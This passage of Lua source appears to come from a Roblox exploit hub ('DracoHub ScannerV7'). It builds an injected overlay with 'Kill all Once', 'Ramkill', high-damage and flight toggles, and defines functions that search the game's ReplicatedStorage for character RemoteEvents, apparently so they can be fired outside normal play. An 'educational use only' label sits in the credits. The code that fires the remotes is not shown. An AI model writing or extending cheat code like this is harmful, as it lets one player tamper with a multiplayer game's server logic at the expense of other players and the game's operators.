	afTxt.Name = "AfTxt"
	afTxt.Size = UDim2.new(0, 110, 0, 16)
	afTxt.Position = UDim2.new(0, 20, 0, 36)
	afTxt.BackgroundTransparency = 1
	afTxt.Font = Enum.Font.Gotham
	afTxt.TextSize = 9
	afTxt.TextXAlignment = Enum.TextXAlignment.Left
	afTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	afTxt.Text = "auto finish"
	afTxt.Parent = bar
	end
	local afSw = bar:FindFirstChild("AfSw")
	if not afSw then
	afSw = Instance.new("TextButton")
	afSw.Name = "AfSw"
	afSw.Size = UDim2.new(0, 36, 0, 16)
	afSw.Position = UDim2.new(1, -42, 0, 36)
	afSw.Text = ""
	afSw.AutoButtonColor = false
	afSw.Parent = bar
	Instance.new("UICorner", afSw).CornerRadius = UDim.new(1, 0)
	local dot = Instance.new("Frame")
	dot.Name = "Dot"
	dot.Size = UDim2.new(0, 14, 0, 14)
	dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	dot.Parent = afSw
	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
	afSw.MouseButton1Click:Connect(function()
	local on = not (li:GetAttribute("AutoFinish") ~= false)
	li:SetAttribute("AutoFinish", on)
	afSw.BackgroundColor3 = on and Color3.fromRGB(46, 160, 70) or Color3.fromRGB(70, 70, 70)
	local d = afSw:FindFirstChild("Dot")
	if d then
	d.Position = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
	end
	end)
	end
	afTxt.Visible = true
	afSw.Visible = true
	local onAf = li:GetAttribute("AutoFinish") ~= false
	afSw.BackgroundColor3 = onAf and Color3.fromRGB(46, 160, 70) or Color3.fromRGB(70, 70, 70)
	local dot = afSw:FindFirstChild("Dot")
	if dot then
	dot.Position = onAf and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
	end
	for _, ch in ipairs(bar:GetChildren()) do
	if ch:IsA("GuiObject") then
	if ch.Name == "AfTxt" or ch.Name == "AfSw" then
	ch.Visible = true
	elseif ch.Name == "WvRiotTxt" or ch.Name == "RiotSw" or ch.Name == "WvRiotHint" then
	ch.Visible = false
	elseif ch:IsA("TextLabel") and (ch.Text == "Dp Life Insure" or ch.Text == "WC Life Insure" or ch.Text == "WV Life Insure") then
	ch.Text = "WV Life Insure"
	ch.Visible = true
	elseif ch.Name == "BothOnHint" or ch.Position.Y.Offset >= 28 then
	ch.Visible = false
	end
	end
	end
	end
	end
	end
	if fg2 then
	local roar = fg2:FindFirstChild("Roar")
	if roar then
	roar:Destroy()
	end
	end
	end)
end
local KillAllBtn = Instance.new("TextButton")
KillAllBtn.Size = UDim2.new(0.5, -8, 0, 24)
KillAllBtn.Position = UDim2.new(0, 5, 0, 214)
KillAllBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
KillAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
KillAllBtn.Font = Enum.Font.GothamBold
KillAllBtn.TextSize = 10
KillAllBtn.Text = "Kill all Once"
KillAllBtn.TextScaled = true
KillAllBtn.Parent = Page2Scroll
local KillAllCorner = Instance.new("UICorner")
KillAllCorner.CornerRadius = UDim.new(0, 4)
KillAllCorner.Parent = KillAllBtn
local MoveModeBtn = Instance.new("TextButton")
MoveModeBtn.Size = UDim2.new(1, -10, 0, 20)
MoveModeBtn.Position = UDim2.new(0, 5, 0, 371)
MoveModeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
MoveModeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MoveModeBtn.Font = Enum.Font.GothamBold
MoveModeBtn.TextSize = 10
MoveModeBtn.Text = "Move Skills: Locked"
MoveModeBtn.TextScaled = true
MoveModeBtn.Parent = Page2Scroll
local MoveModeCorner = Instance.new("UICorner") MoveModeCorner.CornerRadius = UDim.new(0,4) MoveModeCorner.Parent = MoveModeBtn
local ResetPosBtn = Instance.new("TextButton")
ResetPosBtn.Size = UDim2.new(0.5, -8, 0, 20)
ResetPosBtn.Position = UDim2.new(0.5, 2, 0, 371)
ResetPosBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
ResetPosBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ResetPosBtn.Font = Enum.Font.GothamBold
ResetPosBtn.TextSize = 10
ResetPosBtn.Text = "Reset"
ResetPosBtn.Visible = false
ResetPosBtn.Parent = Page2Scroll
local ResetPosCorner = Instance.new("UICorner") ResetPosCorner.CornerRadius = UDim.new(0,4) ResetPosCorner.Parent = ResetPosBtn
local FlightToggleBtn = Instance.new("TextButton")
FlightToggleBtn.Size = UDim2.new(1, -10, 0, 20)
FlightToggleBtn.Position = UDim2.new(0, 5, 0, 338)
FlightToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 100, 100)
FlightToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlightToggleBtn.Font = Enum.Font.GothamBold
FlightToggleBtn.TextSize = 12
FlightToggleBtn.Text = "Homelander Fly"
FlightToggleBtn.TextScaled = true
FlightToggleBtn.Parent = Page2Scroll
local FlightToggleCorner = Instance.new("UICorner") FlightToggleCorner.CornerRadius = UDim.new(0,4) FlightToggleCorner.Parent = FlightToggleBtn
local FlightLoadLabel = Instance.new("TextLabel")
FlightLoadLabel.Size = UDim2.new(1, -10, 0, 16)
FlightLoadLabel.Position = UDim2.new(0, 5, 0, 393)
FlightLoadLabel.BackgroundTransparency = 1
FlightLoadLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
FlightLoadLabel.Font = Enum.Font.Gotham
FlightLoadLabel.TextSize = 10
FlightLoadLabel.Text = ""
FlightLoadLabel.Visible = false
FlightLoadLabel.TextXAlignment = Enum.TextXAlignment.Left
FlightLoadLabel.Parent = Page2Scroll
local SettingsFoldBtn = Instance.new("TextButton")
SettingsFoldBtn.Size = UDim2.new(1, -10, 0, 24)
SettingsFoldBtn.Position = UDim2.new(0, 5, 0, 562)
SettingsFoldBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SettingsFoldBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsFoldBtn.Font = Enum.Font.GothamBold
SettingsFoldBtn.TextSize = 12
SettingsFoldBtn.Text = "Settings ▼"
SettingsFoldBtn.Parent = Page2Scroll
local SettingsFoldCorner = Instance.new("UICorner") SettingsFoldCorner.CornerRadius = UDim.new(0,4) SettingsFoldCorner.Parent = SettingsFoldBtn
local SettingsContent = Instance.new("Frame")
SettingsContent.Size = UDim2.new(1, -10, 0, 110)
SettingsContent.Position = UDim2.new(0, 5, 0, 588)
SettingsContent.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SettingsContent.BorderSizePixel = 0
SettingsContent.Visible = false
SettingsContent.Parent = Page2Scroll
Page2Credit = Instance.new("TextLabel")
Page2Credit.Name = "Page2Credit"
Page2Credit.Size = UDim2.new(1, -4, 0, 120)
Page2Credit.Position = UDim2.new(0, 2, 0, 594)
Page2Credit.BackgroundTransparency = 1
Page2Credit.RichText = true
Page2Credit.TextScaled = false
Page2Credit.TextWrapped = true
Page2Credit.TextSize = 7
Page2Credit.Font = Enum.Font.RobotoMono
Page2Credit.TextColor3 = Color3.fromRGB(150, 150, 150)
Page2Credit.TextXAlignment = Enum.TextXAlignment.Left
Page2Credit.TextYAlignment = Enum.TextYAlignment.Top
Page2Credit.Text = "Base Script: <b>DracoHub</b> ScannerV7\nRemastered : <b>happyYYDS1314</b>\nCredits    : <b>Dark Hydra Hub</b>\n             (Code Support)\n             <b>Nathaniel B</b>\n             (Code Support)"
Page2Credit.Parent = Page2Scroll
Page2Warn = Instance.new("TextLabel")
Page2Warn.Name = "Page2Warn"
Page2Warn.Size = UDim2.new(1, -10, 0, 42)
Page2Warn.Position = UDim2.new(0, 5, 0, 718)
Page2Warn.BackgroundTransparency = 1
Page2Warn.RichText = true
Page2Warn.TextScaled = false
Page2Warn.TextWrapped = true
Page2Warn.TextSize = 7
Page2Warn.Font = Enum.Font.Gotham
Page2Warn.TextColor3 = Color3.fromRGB(150, 150, 150)
Page2Warn.TextXAlignment = Enum.TextXAlignment.Center
Page2Warn.TextYAlignment = Enum.TextYAlignment.Top
Page2Warn.Text = "* WARNING *\nFor educational use only.\nUse at your own risk."
Page2Warn.Parent = Page2Scroll
local SettingsContentCorner = Instance.new("UICorner") SettingsContentCorner.CornerRadius = UDim.new(0,4) SettingsContentCorner.Parent = SettingsContent
local SliderTitle = Instance.new("TextLabel")
SliderTitle.Size = UDim2.new(1,-10,0,18) SliderTitle.Position = UDim2.new(0,5,0,5) SliderTitle.BackgroundTransparency = 1
SliderTitle.TextColor3 = Color3.fromRGB(220,220,220) SliderTitle.Font = Enum.Font.GothamBold SliderTitle.TextSize = 11 SliderTitle.Text = "UI Scale" SliderTitle.TextXAlignment = Enum.TextXAlignment.Left SliderTitle.Parent = SettingsContent
local SliderTrack = Instance.new("Frame")
SliderTrack.Name = "SliderTrack" SliderTrack.Size = UDim2.new(1,-30,0,8) SliderTrack.Position = UDim2.new(0,15,0,30) SliderTrack.BackgroundColor3 = Color3.fromRGB(50,50,50) SliderTrack.BorderSizePixel = 0 SliderTrack.Parent = SettingsContent
local SliderTrackCorner = Instance.new("UICorner") SliderTrackCorner.CornerRadius = UDim.new(0,4) SliderTrackCorner.Parent = SliderTrack
local SliderFill = Instance.new("Frame")
SliderFill.Name = "SliderFill" SliderFill.Size = UDim2.new(0.5,0,1,0) SliderFill.BackgroundColor3 = Color3.fromRGB(80,50,120) SliderFill.BorderSizePixel = 0 SliderFill.Parent = SliderTrack
local SliderFillCorner = Instance.new("UICorner") SliderFillCorner.CornerRadius = UDim.new(0,4) SliderFillCorner.Parent = SliderFill
local SliderThumb = Instance.new("TextButton")
SliderThumb.Name = "SliderThumb" SliderThumb.Size = UDim2.new(0,16,0,16) SliderThumb.Position = UDim2.new(0.5,-8,0.5,-8) SliderThumb.BackgroundColor3 = Color3.fromRGB(255,255,255) SliderThumb.Text = "" SliderThumb.AutoButtonColor = false SliderThumb.Parent = SliderTrack
local SliderThumbCorner = Instance.new("UICorner") SliderThumbCorner.CornerRadius = UDim.new(1,0) SliderThumbCorner.Parent = SliderThumb
local PercentageLabel = Instance.new("TextLabel")
PercentageLabel.Size = UDim2.new(0,50,0,18) PercentageLabel.Position = UDim2.new(1,-55,0,40) PercentageLabel.BackgroundTransparency = 1
PercentageLabel.TextColor3 = Color3.fromRGB(255,255,255) PercentageLabel.Font = Enum.Font.GothamBold PercentageLabel.TextSize = 11 PercentageLabel.Text = "100%" PercentageLabel.TextXAlignment = Enum.TextXAlignment.Right PercentageLabel.Parent = SettingsContent
local CancelScriptBtn = Instance.new("TextButton")
CancelScriptBtn.Size = UDim2.new(1, -10, 0, 22)
CancelScriptBtn.Position = UDim2.new(0, 5, 0, 70)
CancelScriptBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
CancelScriptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CancelScriptBtn.Font = Enum.Font.GothamBold
CancelScriptBtn.TextSize = 11
CancelScriptBtn.Text = "Cancel Script"
CancelScriptBtn.Parent = SettingsContent
local CancelScriptCorner = Instance.new("UICorner") CancelScriptCorner.CornerRadius = UDim.new(0,4) CancelScriptCorner.Parent = CancelScriptBtn
local settingsOpen = false
SettingsFoldBtn.MouseButton1Click:Connect(function()
	settingsOpen = not settingsOpen
	SettingsContent.Visible = settingsOpen
	SettingsFoldBtn.Text = settingsOpen and "Settings ▲" or "Settings ▼"
	if Page2Credit then
	Page2Credit.Visible = not settingsOpen
	end
	if Page2Warn then
	Page2Warn.Visible = not settingsOpen
	end
end)
-- ==================== Floating Buttons ====================
local FloatingGui = Instance.new("ScreenGui")
FloatingGui.Name = "DracoHubFloatingButtons"
FloatingGui.ResetOnSpawn = false
FloatingGui.IgnoreGuiInset = true
FloatingGui.DisplayOrder = 9999
FloatingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
FloatingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
local function applyButtonAutoScale(button)
	button.TextScaled = true
	button.TextWrapped = true
	button.TextSize = 14
end
local LaserButton = Instance.new("TextButton")
LaserButton.Size = UDim2.new(0, 60, 0, 30)
LaserButton.Position = DEFAULT_POSITIONS.Laser
LaserButton.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
LaserButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LaserButton.Font = Enum.Font.GothamBold
LaserButton.Text = "Laser"
LaserButton.Visible = false
applyButtonAutoScale(LaserButton)
LaserButton.Parent = FloatingGui
local LaserCorner = Instance.new("UICorner") LaserCorner.CornerRadius = UDim.new(0, 8) LaserCorner.Parent = LaserButton
do
	local b = Instance.new("TextButton")
	b.Name = "HomeExtra"
	b.Size = UDim2.new(0, 60, 0, 30)
	b.Position = UDim2.new(1, -240, 0.5, -138)
	b.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamBold
	b.Text = "Tear"
	b.TextScaled = true
	b.TextWrapped = true
	b.Visible = false
	b.Parent = FloatingGui
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = b
	local hz = Instance.new("TextLabel")
	hz.Name = "PcHint"
	hz.Size = UDim2.new(1, 0, 0, 12)
	hz.Position = UDim2.new(0, 0, 1, -6)
	hz.BackgroundTransparency = 1
	hz.Font = Enum.Font.GothamBold
	hz.TextSize = 11
	hz.TextColor3 = Color3.fromRGB(230, 230, 230)
	hz.Text = "Z"
	hz.Visible = false
	hz.Parent = b
end
do
	local b = Instance.new("TextButton")
	b.Name = "DeadpoolSkill"
	b.Size = UDim2.new(0, 60, 0, 30)
	b.Position = DEFAULT_POSITIONS.Laser
	b.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamBold
	b.Text = "Gun"
	b.Visible = false
	b.ZIndex = 20
	b.Parent = FloatingGui
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = b
	local sh = Instance.new("TextButton")
	sh.Name = "DeadpoolShoot"
	sh.Size = UDim2.new(0, 60, 0, 60)
	sh.Position = UDim2.new(1, -240, 0.5, -64)
	sh.BackgroundColor3 = Color3.fromRGB(160, 20, 20)
	sh.TextColor3 = Color3.fromRGB(255, 255, 255)
	sh.Font = Enum.Font.GothamBold
	sh.Text = "Shoot"
	sh.TextScaled = true
	sh.Visible = false
	sh.ZIndex = 100
	local shootGui = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	if shootGui then shootGui:Destroy() end
	shootGui = Instance.new("ScreenGui")
	shootGui.Name = "DracoHubShootLayer"
	shootGui.ResetOnSpawn = false
	shootGui.IgnoreGuiInset = true
	shootGui.DisplayOrder = 100000
	shootGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	shootGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
	sh.Parent = shootGui
	local sc = Instance.new("UICorner")
	sc.CornerRadius = UDim.new(0, 8)
	sc.Parent = sh
	local gArrow = Instance.new("TextButton")
	gArrow.Name = "GunMArrow"
	gArrow.Size = UDim2.new(0, 16, 1, 0)
	gArrow.Position = UDim2.new(1, 2, 0, 0)
	gArrow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	gArrow.TextColor3 = Color3.fromRGB(230, 230, 230)
	gArrow.Font = Enum.Font.GothamBold
	gArrow.TextSize = 12
	gArrow.Text = ">"
	gArrow.Visible = true
	gArrow.ZIndex = 21
	gArrow.Parent = b
	local gac = Instance.new("UICorner")
	gac.CornerRadius = UDim.new(0, 4)
	gac.Parent = gArrow
	local gBar = Instance.new("Frame")
	gBar.Name = "GunMBar"
	gBar.Size = UDim2.new(0, 150, 1, 0)
	gBar.Position = UDim2.new(1, 2, 0, 0)
	gBar.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	gBar.Visible = false
	gBar.ZIndex = 21
	gBar.Parent = b
	local gbc = Instance.new("UICorner")
	gbc.CornerRadius = UDim.new(0, 4)
	gbc.Parent = gBar
	local gHigh = Instance.new("TextLabel")
	gHigh.Name = "GunHighBtn"
	gHigh.Size = UDim2.new(0, 78, 1, -4)
	gHigh.Position = UDim2.new(0, 4, 0, 2)
	gHigh.BackgroundTransparency = 1
	gHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
	gHigh.Font = Enum.Font.GothamBold
	gHigh.TextSize = 10
	gHigh.TextXAlignment = Enum.TextXAlignment.Left
	gHigh.Text = "High damage"
	gHigh.ZIndex = 22
	gHigh.Parent = gBar
	local gSw = Instance.new("TextButton")
	gSw.Name = "GunHighSwitch"
	gSw.Size = UDim2.new(0, 32, 0, 16)
	gSw.Position = UDim2.new(0, 84, 0.5, -8)
	gSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	gSw.Text = ""
	gSw.AutoButtonColor = false
	gSw.ZIndex = 22
	gSw.Parent = gBar
	local gsc = Instance.new("UICorner")
	gsc.CornerRadius = UDim.new(1, 0)
	gsc.Parent = gSw
	local gKnob = Instance.new("Frame")
	gKnob.Name = "Knob"
	gKnob.Size = UDim2.new(0, 12, 0, 12)
	gKnob.Position = UDim2.new(0, 2, 0.5, -6)
	gKnob.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
	gKnob.BorderSizePixel = 0
	gKnob.ZIndex = 23
	gKnob.Parent = gSw
	local gkc = Instance.new("UICorner")
	gkc.CornerRadius = UDim.new(1, 0)
	gkc.Parent = gKnob
	local gBack = Instance.new("TextButton")
	gBack.Size = UDim2.new(0, 26, 1, -4)
	gBack.Position = UDim2.new(0, 120, 0, 2)
	gBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	gBack.TextColor3 = Color3.fromRGB(230, 230, 230)
	gBack.Font = Enum.Font.GothamBold
	gBack.TextSize = 12
	gBack.Text = "<"
	gBack.ZIndex = 22
	gBack.Parent = gBar
	local gxc = Instance.new("UICorner")
	gxc.CornerRadius = UDim.new(0, 3)
	gxc.Parent = gBack
	gArrow.MouseButton1Click:Connect(function()
	gArrow.Visible = false
	gBar.Visible = true
	end)
	gBack.MouseButton1Click:Connect(function()
	gBar.Visible = false
	gArrow.Visible = true
	end)
	gSw.MouseButton1Click:Connect(function()
	local on = b:GetAttribute("GunHigh") ~= true
	b:SetAttribute("GunHigh", on)
	if on then
	gSw.BackgroundColor3 = Color3.fromRGB(50, 205, 120)
	gKnob.Position = UDim2.new(0, 18, 0.5, -6)
	else
	gSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	gKnob.Position = UDim2.new(0, 2, 0.5, -6)
	end
	end)
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	gArrow.Size = UDim2.new(1, 0, 0, 16)
	gArrow.Position = UDim2.new(0, 0, 0, -18)
	gArrow.Text = "^"
gBar.Size = UDim2.new(0, 220, 0, 22)
gBar.Position = UDim2.new(0.5, -110, 0, -44)
gBar.Visible = false
gHigh.Size = UDim2.new(0, 100, 1, -4)
gHigh.Position = UDim2.new(0, 6, 0, 2)
gSw.Size = UDim2.new(0, 32, 0, 16)
gSw.Position = UDim2.new(0, 110, 0.5, -8)
gBack.Size = UDim2.new(0, 26, 1, -4)
gBack.Position = UDim2.new(1, -32, 0, 2)
gBack.Text = "v"
local gArrowHint = Instance.new("TextLabel")
gArrowHint.Name = "PcHint"
gArrowHint.Size = UDim2.new(1, 0, 0, 12)
gArrowHint.Position = UDim2.new(0, 0, 1, -2)
gArrowHint.BackgroundTransparency = 1
gArrowHint.Font = Enum.Font.GothamBold
gArrowHint.TextSize = 10
gArrowHint.TextColor3 = Color3.fromRGB(230, 230, 230)
gArrowHint.Text = "T"
gArrowHint.ZIndex = 30
gArrowHint.Parent = gArrow
local gSwHint = Instance.new("TextLabel")
gSwHint.Name = "PcHint"
gSwHint.Size = UDim2.new(0, 14, 0, 12)
gSwHint.Position = UDim2.new(0, 146, 0.5, -6)
gSwHint.BackgroundTransparency = 1
gSwHint.Font = Enum.Font.GothamBold
gSwHint.TextSize = 10
gSwHint.TextColor3 = Color3.fromRGB(230, 230, 230)
gSwHint.Text = "Y"
gSwHint.ZIndex = 30
gSwHint.Parent = gBar
	end
end
local UpthrowButton = Instance.new("TextButton")
UpthrowButton.Size = UDim2.new(0, 60, 0, 60)
UpthrowButton.Position = DEFAULT_POSITIONS.Upthrow
UpthrowButton.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
UpthrowButton.TextColor3 = Color3.fromRGB(255, 255, 255)
UpthrowButton.Font = Enum.Font.GothamBold
UpthrowButton.Text = "Upthrow"
UpthrowButton.Visible = false
applyButtonAutoScale(UpthrowButton)
UpthrowButton.Parent = FloatingGui
local UpthrowCorner = Instance.new("UICorner") UpthrowCorner.CornerRadius = UDim.new(0, 8) UpthrowCorner.Parent = UpthrowButton
local FlashstrikeButton = Instance.new("TextButton")
FlashstrikeButton.Size = UDim2.new(0, 60, 0, 30)
FlashstrikeButton.Position = DEFAULT_POSITIONS.Flashstrike
FlashstrikeButton.BackgroundColor3 = Color3.fromRGB(30, 60, 180)
FlashstrikeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FlashstrikeButton.Font = Enum.Font.GothamBold
FlashstrikeButton.Text = "Flashstrike"
FlashstrikeButton.Visible = false
applyButtonAutoScale(FlashstrikeButton)
FlashstrikeButton.Parent = FloatingGui
local FlashstrikeCorner = Instance.new("UICorner") FlashstrikeCorner.CornerRadius = UDim.new(0, 8) FlashstrikeCorner.Parent = FlashstrikeButton
local KickButton = Instance.new("TextButton")
KickButton.Size = UDim2.new(0, 60, 0, 60)
KickButton.Position = DEFAULT_POSITIONS.Kick
KickButton.BackgroundColor3 = Color3.fromRGB(150, 30, 150)
KickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
KickButton.Font = Enum.Font.GothamBold
KickButton.Text = "One punch"
KickButton.Visible = false
applyButtonAutoScale(KickButton)
KickButton.Parent = FloatingGui
local KickCorner = Instance.new("UICorner") KickCorner.CornerRadius = UDim.new(0, 8) KickCorner.Parent = KickButton
-- Donut removed, slot reserved
local MoAimButton = Instance.new("TextButton")
MoAimButton.Size = UDim2.new(0, 60, 0, 60)
MoAimButton.Position = DEFAULT_POSITIONS.MoAim
MoAimButton.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
MoAimButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MoAimButton.Font = Enum.Font.GothamBold
MoAimButton.Text = "Ramkill"
MoAimButton.TextScaled = true
MoAimButton.TextWrapped = true
MoAimButton.TextSize = 11
MoAimButton.Visible = false
MoAimButton.Parent = FloatingGui
local MoAimCorner = Instance.new("UICorner") MoAimCorner.CornerRadius = UDim.new(0, 8) MoAimCorner.Parent = MoAimButton
do
	local show = LocalPlayer:GetAttribute("YYDSPC") == true
	local x = Instance.new("TextLabel")
	x.Name = "PcHint"
	x.Size = UDim2.new(1, 0, 0, 12)
	x.Position = UDim2.new(0, 0, 1, -6)
	x.BackgroundTransparency = 1
	x.Font = Enum.Font.GothamBold
	x.TextSize = 11
	x.TextColor3 = Color3.fromRGB(230, 230, 230)
	x.Text = "X"
	x.Visible = show
	x.Parent = FlashstrikeButton
	local c = Instance.new("TextLabel")
	c.Name = "PcHint"
	c.Size = UDim2.new(1, 0, 0, 12)
	c.Position = UDim2.new(0, 0, 1, -6)
	c.BackgroundTransparency = 1
	c.Font = Enum.Font.GothamBold
	c.TextSize = 11
	c.TextColor3 = Color3.fromRGB(230, 230, 230)
	c.Text = "C"
	c.Visible = show
	c.Parent = LaserButton
	local v = Instance.new("TextLabel")
	v.Name = "PcHint"
	v.Size = UDim2.new(1, 0, 0, 12)
	v.Position = UDim2.new(0, 0, 1, -6)
	v.BackgroundTransparency = 1
	v.Font = Enum.Font.GothamBold
	v.TextSize = 11
	v.TextColor3 = Color3.fromRGB(230, 230, 230)
	v.Text = "V"
	v.Visible = show
	v.Parent = KickButton
	local b = Instance.new("TextLabel")
	b.Name = "PcHint"
	b.Size = UDim2.new(1, 0, 0, 12)
	b.Position = UDim2.new(0, 0, 1, -6)
	b.BackgroundTransparency = 1
	b.Font = Enum.Font.GothamBold
	b.TextSize = 11
	b.TextColor3 = Color3.fromRGB(230, 230, 230)
	b.Text = "B"
	b.Visible = show
	b.Parent = UpthrowButton
	local rc = Instance.new("TextLabel")
	rc.Name = "PcHint"
	rc.Size = UDim2.new(1, 0, 0, 12)
	rc.Position = UDim2.new(0, 0, 1, -6)
	rc.BackgroundTransparency = 1
	rc.Font = Enum.Font.GothamBold
	rc.TextSize = 11
	rc.TextColor3 = Color3.fromRGB(230, 230, 230)
	rc.Text = "C"
	rc.Visible = show
	rc.Parent = MoAimButton
end
cancelButton = Instance.new("TextButton")
cancelButton.Size = UDim2.new(0, 40, 0, 26)
cancelButton.Position = UDim2.new(0, -46, 0.5, -13)
cancelButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
cancelButton.Font = Enum.Font.GothamBold
cancelButton.Text = "Cancel"
cancelButton.TextScaled = true
cancelButton.Visible = false
cancelButton.Parent = MoAimButton
local cancelCorner = Instance.new("UICorner") cancelCorner.CornerRadius = UDim.new(0, 8) cancelCorner.Parent = cancelButton
do
	local r = Instance.new("TextLabel")
	r.Name = "PcHint"
	r.Size = UDim2.new(1, 0, 0, 12)
	r.Position = UDim2.new(0, 0, 1, -6)
	r.BackgroundTransparency = 1
	r.Font = Enum.Font.GothamBold
	r.TextSize = 11
	r.TextColor3 = Color3.fromRGB(230, 230, 230)
	r.Text = "R"
	r.Visible = LocalPlayer:GetAttribute("YYDSPC") == true
	r.Parent = cancelButton
end
-- ==================== Move Lock ====================
local moveUnlocked = false
-- ==================== Remote Finders ====================
local function findHomelanderMoveOneRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("homelander") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name == "MoveOne" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findHomelanderThrowDownRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("homelander") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name == "ThrowDown" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findTheFlashCwFinalRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("theflashcw") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name == "Final" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findSteveHShieldCounterRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder.Name:lower() == "steve_h" then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name == "ShieldCounter" then
	return remote
	end
	end
	end
	break
	end
	end
	return nil
end
local function findSpiderManWebBlossomRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("spiderman") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name:lower():find("webbloss") then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findTheFlashCwFastestManRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("theflashcw") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name:lower() == "fastestman" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findAmazoFinisherRemote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
	if folder.Name:lower():find("amazo") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") and remote.Name:lower() == "finisher" then
	return remote
	end
	end
	end
	end
	end
	end
	return nil
end
local function findGhostfaceStab2Remote()
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then return nil end
	for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder:IsA("Folder") or folder:IsA("Model") then
